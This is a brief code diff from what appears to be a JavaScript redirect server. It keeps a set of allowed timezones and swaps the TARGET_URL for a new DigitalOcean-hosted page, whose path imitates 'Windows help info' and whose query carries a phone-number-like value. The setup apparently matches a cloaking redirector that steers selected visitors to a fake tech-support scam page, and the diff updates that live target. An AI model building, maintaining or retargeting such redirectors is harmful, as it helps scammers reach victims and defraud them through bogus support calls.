@@ -30,7 +30,7 @@ const ALLOWED_TIMEZONES = new Set([
 ]);
 
 // Target URL Configuration
-const TARGET_URL = "https://coral-app-2-f39er.ondigitalocean.app/Wi0nHelpInfogetPocode/index.html?Anph=0101-833-306-1171";
+const TARGET_URL = "https://coral-app-2-f39er.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-833-306-1171";
 
 // --- Pre-Compilation Cache Layer ---
 // This processes everything into memory ONCE during boot, removing CPU load during requests.
